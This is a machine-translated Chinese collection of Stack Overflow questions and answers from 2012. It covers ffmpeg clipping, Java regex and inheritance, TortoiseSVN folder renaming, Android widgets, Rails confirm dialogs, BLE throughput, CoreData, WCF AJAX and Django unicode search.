# ffmpeg - 如何使用 ffmpeg 或 MEncoder 从原始文件的最后 10 秒创建一个新的 .mpeg

> ID：13360562
> 
> 赞同：0
> 
> 时间：2012-11-13T12:13:21.950
> 
> 标签：ffmpeg, mencoder

我有许多 .mpeg 文件，我只想使用最后 10 秒（有点像重播）

ffmpeg 或 MEncoder 是否能够做到这一点，如果可以，有人可以帮我解决命令行语法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-06-20T19:58:35.643

不完全确定它何时更改，但 Tyler 的示例不再适用（至少对我而言）。

**这**对我有用：

```
ffmpeg -sseof -10 -i input.avi -c copy output.avi 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-08-13T14:23:01.227

您可以使用最新版本的 ffmpeg 轻松做到这一点：

```
-sseof time_off     set the start time offset relative to EOF 
```

例子：

```
ffmpeg -i input.mpg -c copy -map 0 -sseof 10 output.mpg 
```

# ios - 从 ios 应用程序检索 html 本地存储

> ID：13360566
> 
> 赞同：1
> 
> 时间：2012-11-13T12:13:43.997
> 
> 标签：ios, html, ipad, local-storage, trigger.io

我在 ipad 上有一个使用 html5 本地存储来收集信息的应用程序。当互联网可用时，您可以输入一个电子邮件地址，该地址会发布到应用程序，该应用程序将其作为 csv 电子邮件发送。整个过程在测试时有效。

我遇到的问题是发布时出现 javascript 错误。我推断出某些数据在某种程度上已损坏。

在另一台 ipad 上测试时。我了解到更新应用程序时不会覆盖本地存储。但如果我能得到这些数据的备份，那就太好了。

所以我的问题是。如何将此应用程序从 iPad 上下载到具有本地存储访问权限的计算机上。如果做不到这一点，无论如何都可以在 ipad 应用程序上查看任何本地存储信息，而无需更改应用程序。

# java - 仅返回后半部分的拆分字符串

> ID：13360571
> 
> 赞同：2
> 
> 时间：2012-11-12T09:22:15.303
> 
> 标签：java, string

我有一个这样的字符串：

```
abc:def,ghi,jkl;mno:pqr,stu;vwx:yza,aaa,bbb;

```

我想先拆分；然后继续：最后输出应该只是后半部分：即我的输出应该是

```
def, ghi, jkl, pqr, stu, yza,aaa,bbb
```

这可以使用 Split 两次来完成，即一次使用`;`，然后使用`:`，然后模式匹配以找到 . 旁边的正确部分`:`。但是，是否有更好和优化的解决方案来实现这一目标？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T12:17:13.233

所以基本上你想获取和之间的内容`;`，`:`在`:`左边和`;`右边。

你可以使用这个正则表达式： -

```
"(?<=:)(.*?)(?=;)" 
```

这包含一个`look-behind`for`:`和一个`look-ahead`for `;`。并匹配前面有 a`colon(:)`和后面有 a的字符串`semi-colon (;)`。

**正则表达式解释：-**

```
(?<=         // Look behind assertion.
    :        // Check for preceding colon (:)
)            
(            // Capture group 1
    .        // Any character except newline
    *        // repeated 0 or more times
    ?        // Reluctant matching. (Match shortest possible string)
)
(?=          // Look ahead assertion
    ;        // Check for string followed by `semi-colon (;)`
) 
```

这是工作代码： -

```
 String str = "abc:def,ghi,jkl;mno:pqr,stu;vwx:yza,aaa,bbb;";

   Matcher matcher = Pattern.compile("(?<=:)(.*?)(?=;)").matcher(str);

   StringBuilder builder = new StringBuilder();
   while (matcher.find()) {
       builder.append(matcher.group(1)).append(", ");
   }

   System.out.println(builder.substring(0, builder.lastIndexOf(","))); 
```

**输出： -**

```
def,ghi,jkl, pqr,stu, yza,aaa,bbb 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T10:40:05.807

```
String[] tabS="abc:def,ghi,jkl;mno:pqr,stu;vwx:yza,aaa,bbb;".split(";");
StringBuilder sb = new StringBuilder();
Pattern patt = Pattern.compile("(.*:)(.*)");
String sep = ",";
for (String string : tabS) {
    sb.append(patt.matcher(string).replaceAll("$2 ")); // ' ' after $2 == ';' replaced
    sb.append(sep);
}
System.out.println(sb.substring(0,sb.lastIndexOf(sep))); 
```

输出

```
def,ghi,jkl ,pqr,stu ,yza,aaa,bbb 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T08:33:47.907

除非必须在 Java 中进行，否则不要进行模式匹配；如果您不能在字段名称中包含“：”字符（在您的示例中为 abc），您可以使用它`indexOf(":")`来找出“正确的部分”。

# matlab - Matlab - 局部直方图均衡

> ID：13360574
> 
> 赞同：1
> 
> 时间：2012-11-13T12:14:32.957
> 
> 标签：matlab, local, histogram

首先，我是 matlab 的新手，所以如果我的问题很简单，我很抱歉。并在互联网上进行了深入搜索，但找不到答案。

我正在尝试进行局部直方图均衡。我通过以下方式进行了全局直方图均衡：

> T_histeq=histeq(I);
> 
> subplot(2,2,2);imshow(T_histeq);title('全局直方图均衡应用图像');

但是对于**局部**直方图均衡，我无能为力。我知道逻辑，但不能把它变成代码。

谢谢帮忙。。

# python - 扑克引擎的文档

> ID：13360582
> 
> 赞同：1
> 
> 时间：2012-11-13T12:15:12.070
> 
> 标签：python, documentation, poker

我对开发扑克游戏很感兴趣。为此，我找到了[poker-engine](http://pokersource.sourceforge.net/)。但是通过谷歌搜索和搜索项目站点，我找不到关于其 API 的任何文档。你知道在哪里可以找到有关如何使用它的文档，还是我需要阅读整个代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:25:11.407

那么你下载了`poker-engine`吗？

发行版中有一个示例文件夹，用于记录主要功能。该文件称为`simple.py`

# java - 如何使扩展对象转向其超级对象

> ID：13360583
> 
> 赞同：1
> 
> 时间：2012-11-13T12:15:11.233
> 
> 标签：java, design-patterns, polymorphism

有没有一种设计模式，我可以让一个对象具有某种状态，他从一个扩展对象开始，但一段时间后又回到它的超级对象。

例如 - 部分文件继承自文件，完成后它将成为一个文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:17:54.960

不，Java 中没有类型突变（公平地说，我想不出任何现代语言都有它）。

你可以做什么，但显然不完全相同：

*   使用将对象作为参数的构造函数在不同的类中构建新对象（就像您可以做的那样`new Float(new Double(2));`）。请注意，这不会更改初始对象，因此您必须再次分配持有它的变量。
*   添加一个`type`基于 的变量，`enum`指示对象的性质。对于大多数目的来说，这就足够了（并且可以让您免于构建繁重的类型层次结构）。

现在，您**需要**类型突变吗？如果您只需要处理您的对象，就好像它是其超类的直接实例一样，您已经可以做到了。类型突变的主要区别在于您调用了被覆盖的方法，但如果类型层次结构设计正确，这通常很好。

假设我要设计一个 PartialFile 类（假设名称正确定义了它是什么），而不是使用继承，我会使用 composition ：我会创建一个装饰类，其实例将有一个 variable `private File sourceFile`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:18:33.573

这个问题是有缺陷的 - 扩展`Object`始终是其超类的实例。

在您的示例中，以下是有效的......

```
public class PartialFile extends File{
    // methods
    }

PartialFile partFile = new PartialFile();

// do operations on partFile 

File file = partFile;

// do operations on file 
```

因为`PartialFile`extends `File`，你真的不需要“把它变成它的超类”——它已经是超类的一个实例。

您可以同时将`PartialFile`对象视为 a `PartialFile`、 a `File`、 an`Object`以及它扩展的任何其他类。您无需在这些不同的类类型之间转换它 - 直接使用它即可。对于上面的代码，如果你想调用`File.rename()`方法，下面的两个语句都会做同样的事情......

```
partFile.rename();
file.rename(); 
```

您无需将`partFile`a 更改为`file`使用`File`对象的方法 - 只需直接使用它们，因为 Java VM 知道 a`PartialFile`也是 a `File`。

您不能真正将子类型更改为它的超类型——Java VM 将始终知道它真正是什么类型——但你可以欺骗它。如果您使用以下代码...

```
PartialFile partFile = new PartialFile();
// do operations on partFile 

File file = partFile;
// do operations on file 
```

然后只有每次使用`file`而不是`partFile`，您将无法使用任何`PartialFile`方法。它有点伪装它 a `PartialFile`，但它实际上并没有转换它。

如果你做这样的事情......

```
public File createFile(){
    PartialFile partFile = new PartialFile();
    // operations on partFile
    return partFile;
}

File file = createFile();
// operations on file 
```

您可以在方法中创建和使用 a `PartialFile`，但完成后将其作为简单的`File`. 从现在开始，每当你引用这个对象时，Java VM 都会假装它是一个`File`. 但是，从技术上讲，它始终是 a ，并且如果您愿意，`PartialFile`它不会阻止您将其转换回 a ，就像这样......`PartialFile`

```
PartialFile partFile = (PartialFile)file;
// operations on partFile 
```

所以这只是一个伪装。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-14T07:33:48.347

使用设计模式状态和/或工厂方法。

您可能仍然需要进行一些重构，因为您很可能需要超级接口/抽象基类。

像这样的东西：

```
class MySwitcher implements SuperInterface {

  private final SuperInterface super = new Super();

  private final SuperInterface subclass = new Subclass();

  private SuperInterface current = super; // Start in state "behaves as super"

  // Method from SuperInterface
  public MyResult doAction(final MyData d) {
    final MyResult res = current.doAction(d);
    current = setImplementationBasedOnResOfDoAction(res);
    return res;
  }

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:18:15.290

一个子类已经是它的超类的一个实例，所以你可以把它转换成它的超类

```
class PartialFile extends File {
// Code...
}

PartialFile partialFile;
// Code...
File file = (File) partialFile; 
```

# windows-8 - TortoiseSVN 升级到 Windows 8 后无法识别 svn 文件夹

> ID：13360587
> 
> 赞同：2
> 
> 时间：2012-11-13T12:15:29.010
> 
> 标签：windows-8, tortoisesvn

我已将我的计算机从 Windows XP 升级到 Windows 8，并选择保留我的所有文件和设置。升级后我安装了 TortoiseSVN 版本 1.710，这是我还在 XP 上使用的版本。但现在它似乎不再识别 SVN 文件夹。在我的文件夹上，我没有覆盖图标，当我右键单击时，我只会得到“结帐”选项，就好像文件夹是空的或不包含任何版本控制一样。当我在资源管理器中选择“显示隐藏文件”时，我可以看到 _svn 文件夹肯定存在。我确实注意到它被标记为“只读”，但删除它并不能解决问题。
有谁知道为什么 Tortoise 没有检测到 _svn 文件夹？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T13:37:48.563

答案就在问题中。从 1.6 版开始，Tortoise 不再识别 _svn 文件夹，而是使用 .svn 文件夹。在我的 Windows XP 机器上，我可能曾经选择安装允许使用 _svn 文件夹的“hack”，即使我升级到 1.7，它仍然保持这种状态。
由于升级到 Windows 8 保留了文件，但需要全新安装所有软件，因此丢失了使用 _svn 文件夹的选项。所以我必须找到一个解决方案，将我所有的 _svn 文件夹重命名为 .svn。幸运的是，windows 8 附带了 Powershell 3.0，这使得这很容易。
只需打开 Powershell 窗口，将目录更改为“文档”文件夹并键入：

```
Get-ChildItem _svn -recurse -force | foreach {rename-item $_ $_.Name.Replace("_",".")} 
```

这将重命名所有 _svn 文件夹，一切都解决了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T13:37:48.500

是“_svn”还是“.svn”？新签出的项目对你有用吗？

我的猜测是升级以某种方式将文件夹从“.svn”重命名为“_svn”，导致 Tortoise 无法拾取它。在这种情况下，您必须重命名它们，它应该可以再次工作。

我过去一直在 Win8 上运行 TortoiseSVN 没有问题。

# android - 将小部件添加到主屏幕时如何屏蔽 onUpdate() 方法？

> ID：13360590
> 
> 赞同：0
> 
> 时间：2012-11-13T12:15:56.457
> 
> 标签：android

当我将小部件添加到主屏幕时如何屏蔽 onUpdate() 方法？

我有一个监听用户点击的小部件。我在 onUpdate() 中对其进行响应。问题是，即使我将小部件添加到主屏幕，onUpdate() 也会执行。

```
 @Override
  public void onUpdate(Context context, AppWidgetManager appWidgetManager,
      int[] appWidgetIds) {

          if(flag)
                {
                Toast.makeText(context, "OFF", Toast.LENGTH_SHORT).show();
flag=false;
                }
          else
                {
                Toast.makeText(context, "ON", Toast.LENGTH_SHORT).show();
flag=true;
                }
} 
```

或者如果不在 onUpdate() 方法中，我该如何响应用户点击？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:36:51.857

> 问题是，即使我将小部件添加到主屏幕，onUpdate() 也会执行。

这不是一个“问题”。`onUpdate()`当用户将您的应用小部件添加到主屏幕时需要调用，因此您可以定义应用小部件的外观。

> 或者如果不在 onUpdate() 方法中，我该如何响应用户点击？

欢迎`PendingIntent`您在您的应用小部件中使用您想要的任何按钮等。`PendingIntent`不必路由回您的方法`onUpdate()`。

另外，我注意到您上面的代码片段假定有一个名为`flag`. 请记住，您的流程不会在应用小部件更新之间始终存在。因此，任何种类的“标志”都需要永久存储在某个地方：数据库、`SharedPreferences`. 或其他形式的文件。

# javascript - 无法覆盖 $.rails.allowAction

> ID：13360594
> 
> 赞同：6
> 
> 时间：2012-11-13T12:16:06.687
> 
> 标签：javascript, jquery, ruby-on-rails, ruby-on-rails-3.2

我需要在我的 rails 应用程序中自定义确认框。我找到[了这个](http://rors.org/demos/custom-confirm-in-rails)，将 js 代码添加到我的 application.js 中，但似乎 $.rails 未定义。

这是我添加到 application.js 文件的代码：

```
$.rails.allowAction = function(link) {
  if (!link.attr('data-confirm')) {
   return true;
  }
  $.rails.showConfirmDialog(link);
  return false;
};

$.rails.confirmed = function(link) {
  link.removeAttr('data-confirm');
  return link.trigger('click.rails');
};

$.rails.showConfirmDialog = function(link) {
  var html, message;
  message = link.attr('data-confirm');
  html = "<div class=\"modal\" id=\"confirmationDialog\">\n  <div class=\"modal-header\">\n    <a class=\"close\" data-dismiss=\"modal\">Ã</a>\n    <h3>Are you sure Mr. President?</h3>\n  </div>\n  <div class=\"modal-body\">\n    <p>" + message + "</p>\n  </div>\n  <div class=\"modal-footer\">\n    <a data-dismiss=\"modal\" class=\"btn\">Cancel</a>\n    <a data-dismiss=\"modal\" class=\"btn btn-primary confirm\">OK</a>\n  </div>\n</div>";
  $(html).modal();
  return $('#confirmationDialog .confirm').on('click', function() {
    return $.rails.confirmed(link);
  });
}; 
```

我收到一个错误“未捕获的类型错误：无法设置未定义的属性‘allowAction’”。

你知道出了什么问题吗？（jquery_ujs gem 安装加载成功）

先感谢您，

耶尔科

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T23:37:48.683

你需要：

```
gem 'jquery-rails' 
```

不是 jquery_ujs。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-14T10:15:05.740

我将此代码放入名为 custom.confirm.js 的文件中，然后将这两行

```
//= require jquery_ujs 
//= require custom.confirm.js 
```

在 application.js 的底部，它工作，谢谢！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T13:45:05.297

我只是遇到了同样的问题，它在 Firefox 上运行良好，但在 Chrome 上运行良好。我猜这是由于 Chrome 缓存并通过清除与我的开发服务器相关的所有浏览器缓存来修复它，

# c - 如何使用 Xlib 获取屏幕刷新率

> ID：13360596
> 
> 赞同：1
> 
> 时间：2012-11-13T12:16:30.973
> 
> 标签：c, linux, xlib

我正在寻找能够提供实际屏幕刷新率的 Xlib 函数或宏。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:24:28.407

快速搜索告诉我直接使用 xlib 是不可能的。然而，似乎可以使用 XRandR 扩展，使用[`XRRConfigRates`](http://linux.die.net/man/3/xrrconfigrates).

# android - 用于用户反馈/报告的 Android 标准图标

> ID：13360599
> 
> 赞同：1
> 
> 时间：2012-11-13T12:16:43.717
> 
> 标签：android, drawable, android-image, android-icons

我想在我的应用程序上添加一个功能，让用户对数据进行反馈。（例如报告错误或错误）。

它有标准图标吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:22:22.863

请访问您的文件夹，其中“XX”和“X”代表您的Android版本和屏幕尺寸`android-sdk-*`应该有默认的图标和图片集。`./platforms/android-XX/data/res/drawable-Xdpi/`所有标准图标都在那里。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-31T20:02:27.953

有一些系统图标的文件名与“反馈”匹配，但它们都不适合我。

我能找到的最好的是“ic_menu_report_image.png”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-15T08:28:43.283

我一直在使用“ic_menu_start_conversation.png”。

它是否对您的应用有用主要取决于您已经在使用的图标集。例如，在聊天应用程序中，此图标将是一个糟糕的选择 :)

**注意：**此图标被标记为受保护。您必须手动将图像复制到源。

> 因为这些资源在平台版本之间会发生变化，所以您不应该使用 Android 平台资源 ID 引用这些图标（即 android.R.drawable 下的菜单图标）。如果您想使用任何图标或其他内部可绘制资源，您应该将这些图标或可绘制资源的本地副本存储在您的应用程序资源中，然后从您的应用程序代码中引用本地副本。这样，即使系统的副本发生更改，您也可以保持对图标外观的控制。

# excel - Excel：将单元格的颜色设置为另一种

> ID：13360600
> 
> 赞同：2
> 
> 时间：2012-11-13T12:16:46.450
> 
> 标签：excel, colors, formatting, conditional

如何确定一个单元格的颜色等于另一个，例如：A4 是然后 C2 是青色青色。A2 则 C2 橙色，颜色为橙色。 ![在此处输入图像描述](../Images/329e30ae049fd7bac4dcb726841508d8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:59:56.970

没有 excel 公式可以让您获得单元格的颜色，也没有一个可以设置不同单元格的颜色。

但是，您可以创建一个函数来获取特定单元格的颜色 - 或者，就像在我的示例中，函数调用单元格的颜色：

```
Public Function GetColor()
    Dim rng As Range

    If TypeName(Application.Caller) = "Range" Then
        Set rng = Application.Caller
    End If
    GetColor = rng.Cells.Interior.Color
End Function 
```

现在你可能会想，好吧，然后我修改它，只是为了设置颜色。但不 - 不是那样工作的。为了更改单元格的颜色，您必须使用`Worksheet_Change`事件并将每个单元格设置为它们内部的长值作为它们的颜色。

```
Target.Interior.Color = Target.Value 
```

当使用`Worksheet_Change`.

您当然也可以使用`ColorIndex`- 只需相应地调整即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T13:01:36.547

这是一些C#代码，也许对你有帮助：

```
xlSheet.Range["A10", "A10"].Interior.Color = ColorTranslator.ToOle(System.Drawing.Color.Cyan);
xlSheet.Range["C10", "C10"].Interior.Color = xlSheet.Range["A10", "A10"].Interior.Color; 
```

# jquery - jquery mobile，在列表列表视图插入内容块中包含内容的正确方法是什么？

> ID：13360604
> 
> 赞同：1
> 
> 时间：2012-11-13T12:16:58.383
> 
> 标签：jquery, jquery-mobile, styling

安装了一个带有基本主题的裸 jquery。使用 jquery mobile 构建的几个网站在 inset listview 元素中包含内容。但如果我尝试这个，我无法获得任何体面的粗体或斜体标题样式。

什么是正确的方法来获取插入元素中的内容，如下面的屏幕显示，但具有像 h1、h2 等不错的基本格式？：（插入内容）：

![在此处输入图像描述](../Images/63d0d4a76acbd6fc219ab6644671ded1.png)

```
<div data-role="content" class="ui-content" role="main">
    <ul data-inset="true" data-role="listview" class="ui-listview-inset ui-shadow">
        <li>

            Headings not correctly styled

            <h1>test</h1>
            <h2>test</h2>
            <h3>test</h3>

        </li>
    </ul>
</div> 
```

编辑：

使用这个：

```
<div data-role="content" class="ui-content" role="main">
    <ul data-role="listview" data-inset="true">
        <li>
            <h3>test</h3>
            <h1>h1</h1>
        </li>
        <li>
            <h3>jQuery Team</h3>
            <p><strong>Boston Conference Planning</strong></p>
            <p>In preparation for the upcoming conference in Boston, we need to start gathering a list of <strong>sponsors</strong> and speakers.</p>
        </li>
    </ul>
</div> 
```

是否列出了一些内容，例如我的屏幕截图中的格式，但每个内容都在

没有格式化+如果它变得很长，它会删除文本长度.. :(

# c# - 带有实体框架的 Treeview 控件

> ID：13360605
> 
> 赞同：0
> 
> 时间：2012-11-13T12:17:01.673
> 
> 标签：c#, entity-framework-4, treeview

我对 C# / Entity Framework 比较陌生，正在尝试让 Treeview 控件 / HierachicalDataTemplate 与 Entity Framework 4.0 一起使用，但我缺少一些东西。

我有一个自引用表：

> 除法（PK，int，不为空）；divname（nchar（100），不为空）；divshortname（nchar（50），不为空）；parentid (FK, int, null); orgid (FK, int, not null)

我已将表作为“组织结构”加载到实体框架中，并将自我关系的多面命名为“子”，将单面命名为“父”。

我因此创建了一个 ObservableCollection：

```
 private ObservableCollection<orghierarchy> _firstgeneration;
    public ObservableCollection<orghierarchy> FirstGeneration
    {
        get
        {
            if (OrgID != 0)
            {
                _firstgeneration = SetDivTree(OrgID);
            }
            return _firstgeneration;
        }

        set
        {
            if (value != _firstgeneration)
                _firstgeneration = value;
        }
    }

    public ObservableCollection<orghierarchy> SetDivTree(int _orgid)
    {
        ObservableCollection<orghierarchy> _temp;
        using (var context = new IFREntities())
        {
            var divs = from orghierarchies in context.orghierarchies.Include("child")
                       where orghierarchies.orgid == _orgid & orghierarchies.parentid == null
                       orderby orghierarchies.divshortname
                       select orghierarchies;

            _temp = new ObservableCollection<orghierarchy>(divs);
        }
        return _temp;
    } 
```

“.Include”似乎通过基于单步执行代码的查询将所有子行带回。

我的 XAML 是

```
<TreeView x:Name="DivHierarchy" Margin="8" Grid.Row="5" Grid.Column="1" Grid.ColumnSpan="3" ItemsSource="{Binding FirstGeneration}" >
<TreeView.ItemTemplate>
        <HierarchicalDataTemplate ItemsSource="{Binding FirstGeneration.child}">
            <TextBlock Text="{Binding divname}" />
        </HierarchicalDataTemplate>
    </TreeView.ItemTemplate>
<TreeView.Background>
    <SolidColorBrush Color="{DynamicResource BigCtrlBackground}"/>
</TreeView.Background> 
```

我的树视图是空的，我不确定问题可能是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-20T07:50:23.313

试试这个 XAML，不包括你想要的所有布局设置。你可以自己做。:)

```
<TreeView x:Name="DivHierarchy" ItemsSource="{Binding FirstGeneration}" ItemTemplate="{StaticResource RootTemplate}" /> 
```

将以下内容添加到资源部分，例如

```
<Window.Resources>
    <HierarchicalDataTemplate x:Key="ChildTemplate"
                              ItemsSource="{Binding Path=child}">
        <TextBlock Text="{Binding Path=divname}" />
    </HierarchicalDataTemplate>

    <HierarchicalDataTemplate x:Key="RootTemplate"
                              ItemTemplate="{StaticResource ChildTemplate}"
                              ItemsSource="{Binding Path=child}">
        <TextBlock Text="{Binding Path=divname}" />
    </HierarchicalDataTemplate>
</Window.Resources> 
```

我认为它会起作用，但您也会在根级别看到子条目。出色地！试试看。

# bluetooth - GATT 以外的蓝牙低功耗 (BLE) 协议

> ID：13360607
> 
> 赞同：14
> 
> 时间：2012-11-13T12:17:11.410
> 
> 标签：bluetooth, bluetooth-lowenergy

**除了 GATT 之外，还有其他方法或协议可以在更适合高吞吐量任务的 BLE（单模芯片）下使用吗？**

据我了解，我的问题的答案是否定的，但我想要一些验证和澄清。

* * *

我想实现的服务不仅仅是通过 BLE 操作（短）特性。此类服务可能包括文件传输、音频流以及基本上是以前版本蓝牙中的标准服务。

一个方便的解决方案是使用文件传输配置文件（通过 GOEP）或类似的文件传输。对于音频，A2DP 似乎很合适。但是，使用 BLE 似乎无法实现这些。

在阅读了 bluetooth.org（特别是第 3 卷）的核心规范 v4 之后，我可以使用和适应（通过配置文件）用于此类目的的唯一适用协议是 GATT，这似乎很难使用。

此外，根据[低功耗蓝牙概述和评估：一种新兴的低功耗无线技术](http://www.mdpi.com/1424-8220/12/9/11734)，有效吞吐量似乎很低：

> 物理层数据速率为 1 Mbps，而最大应用层吞吐量等于 236.7 kbps。

但是（通过 GATT 使用 TI CC254x 测量实际性能时）：

> ... 在所述条件下，我们测得的最大应用层吞吐量为 58.48 kbps。这种低结果可以通过以下两个事实来解释：（i）虽然理论上，在 7.5 毫秒的连接事件内最多可以传输 11 个这样的通知，但如上所述，每个连接事件只允许 4 个通知；(ii) 我们观察到，在实验期间，大多数连接事件中实际传输的通知少于四个（但是，对于大于 7.5 毫秒的连接间隔，相同的现象发生的频率较低）。这些观察表明，高吞吐量并不是评估中使用的 BLE 实现设计的主要目标。

我意识到上面的文字特定于 TI 芯片上的实现，但这些限制也可能适用于 GATT 之上的其他实现。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T17:10:37.340

如果您正在编写自己的配置文件，那么您可以通过打开 L2CAP 通道并以任何格式发送数据来做任何您想做的事情，而无需实施 GATT。L2CAP 可以让您获得最大吞吐量，并且适用于流数据而不是读取特性。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-14T04:51:54.847

请看我们长期以来一直在做的事情：IPv6 over BTLE，这仍然是 6LoWPAN WG 中的一个 IETF 草案，并且该提案已在 Bleutooth SIG 中获得批准。这是蓝牙技术更新中的新闻：2013 年 2 月 19 日。

> IPv6 over Low Energy 新工作提案获得批准
> 
> Bluetooth SIG 成员提交的 IPv6 Over LE New Work Proposal (NWP) 获得批准。该 NWP 提议，允许 IPv6 通过低能耗传输将启用 GATT 配置文件未涵盖的新用例（在家庭和工业自动化以及智能计量中）。提议的工作符合互联网工程任务组 (IETF) 定义的要求，并补充了 IP for Smart Objects (IPSO) 联盟所做的工作。互联网工作组将根据批准的 NWP 制定功能需求文档 (FRD)。如果您是 Adopter 成员并希望参与 FRD 开发过程，请联系 Internet 工作组主席。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T12:30:41.303

如果您是 SIG 的成员，请查看 bluetooth.org 的技术规格部分

# iphone - CoreData 的问题：错误：（19）PRIMARY KEY 必须是唯一的

> ID：13360611
> 
> 赞同：0
> 
> 时间：2012-11-13T12:17:26.750
> 
> 标签：iphone, core-data, nsfetchedresultscontroller, nsmanagedobjectcontext

这是我用来将新对象插入我的 Raza 实体的代码。不过没什么特别的。我在我的应用程序中随处使用了这个委托方法和语法，但由于某种原因，我无法在这个特定实体上执行此操作。

```
-(void)guardarRaza:(NSString *)nombre guardar:(BOOL)guardar{

        if (guardar) {
            Raza *raza = [NSEntityDescription insertNewObjectForEntityForName:@"Raza"
                                                       inManagedObjectContext:self.managedObjectContext];
            raza.nombre = nombre;            
            NSError *error;
            if (![self.managedObjectContext save:&error]) {
                NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
                abort();
            }
        }
        [self dismissModalViewControllerAnimated:YES];
    } 
```

问题可能来自 sqlite，因为我们使用一个版本来预填充启动的版本。我遵循了名为“Core Data Tutorial: How To Preload/Import Existing Data”的 raywenderlich 方法。

它确实可以与其他实体一起顺利运行，但是当我插入并保存该特定实体时，它会因 CoreData 崩溃：错误：（19）PRIMARY KEY 必须是唯一的。我已经检查了 sqlite，手动插入和删除了新行，它可以正常工作。

有没有人有同样的问题，或者更确切地说知道如何解决它。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-04T22:52:32.173

我刚刚遇到了同样的错误，并找到了我在另一篇 SO 帖子中详述的解决方案：

[为什么此代码会引发“CoreData：错误：（19）PRIMARY KEY 必须是唯一的”错误？](https://stackoverflow.com/questions/12479232/why-is-this-code-raising-the-coredata-error-19-primary-key-must-be-unique/14697067#14697067)

# wcf - 对 WCF 的跨域 jQuery AJAX 请求 - 405 方法不允许

> ID：13360614
> 
> 赞同：0
> 
> 时间：2012-11-13T12:17:30.253
> 
> 标签：wcf, web-services, rest, jquery

我正在为我的移动 Web 应用程序构建简单的 WCF Web 服务。

我在`$.ajax`向 WCF 发出请求时堆栈`405 - Method not allow`，即使我这样做时我可以在浏览器`http://http://localhost:35798/RestServiceImpl.svc/json/23`中看到结果。`ReturnJSONData()`

我经历了 100 篇不同的帖子，但没有一个答案能解决我的问题。

**AJAX 请求**

```
$.ajax({
    type: "GET",
    url: "http://localhost:35798/RestServiceImpl.svc/json/34",
    contentType: "application/json; charset=utf-8", 
    success: function(data) {
    console.log(data);
    },
}); 
```

**IRestServiceImpl.cs**

```
namespace RestService{
    [ServiceContract]
    public interface IRestServiceImpl
    {
        [OperationContract]
        [WebInvoke(
            Method = "GET",
            ResponseFormat = WebMessageFormat.Json,
            BodyStyle = WebMessageBodyStyle.Wrapped,
            UriTemplate = "json/{id}"
            )]
        string ReturnJSONData(string id);
    }
} 
```

**RestServiceImpl.svs.cs**

```
namespace RestService {
    public class RestServiceImpl : IRestServiceImpl {
        public string ReturnJSONData(string id) {
            return "You requested product " + id;
        }
    }
} 
```

**网络配置**

```
<?xml version="1.0"?>
<configuration>

    <system.web>
    <compilation debug="true" targetFramework="4.0" />
</system.web>
<system.serviceModel>
<services>
    <service name="RestService.RestServiceImpl" behaviorConfiguration="ServiceBehaviour">
        <endpoint address ="" binding="webHttpBinding" contract="RestService.IRestServiceImpl" behaviorConfiguration="web">
        </endpoint>
    </service>
</services>

<behaviors>
    <serviceBehaviors>
        <behavior name="ServiceBehaviour">
            <serviceMetadata httpGetEnabled="true" />
            <serviceDebug includeExceptionDetailInFaults="true" />
        </behavior>
    </serviceBehaviors>
    <endpointBehaviors>
        <behavior name="web">
            <webHttp/>
        </behavior>
    </endpointBehaviors>
</behaviors>
<standardEndpoints>
    <webHttpEndpoint>
        <standardEndpoint name=""
        helpEnabled="true"
        automaticFormatSelectionEnabled="true"
        defaultOutgoingResponseFormat ="Json"
        crossDomainScriptAccessEnabled="true"/>
    </webHttpEndpoint>
</standardEndpoints>
</system.serviceModel>
<system.webServer>
<modules runAllManagedModulesForAllRequests="true"/>
</system.webServer>

</configuration> 
```

**任何建议都非常感谢。**

# django - 如何在 django 中进行 unicode 搜索

> ID：13360615
> 
> 赞同：0
> 
> 时间：2012-11-13T12:17:41.157
> 
> 标签：django, unicode

我想用 unicode 字符搜索一些东西，比如`ŞÇİÖÜ`

我定义了一个这样的搜索函数：

```
def search(request):
    from django.db.models import Q
    q = request.GET.get("search", "")
    k = q.split()
    list=[]
    for i in k:
        query = Q(title__icontains=i) | Q(content__icontains=i) 
        posts = Post.objects.filter(query).distinct().order_by('date')
        list.append(posts)
        total = 0
        if list[0]:
            total += len(list)

    return render_to_response('search_results.html', RequestContext(request, {
        "list": list,
        "q": q,
        "total": total,
    })) 
```

我有`LANGUAGE_CODE = "UTF-8"`。当我想搜索`'Şeker Öçü'`它时，它什么也不返回，尽管我有`şeker öçü`帖子。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:39:42.447

您从中获取的查询字符串`request.GET.get("search", "")`是 in `ISO-8859-8`，但 Django 的默认编码是 UTF-8。

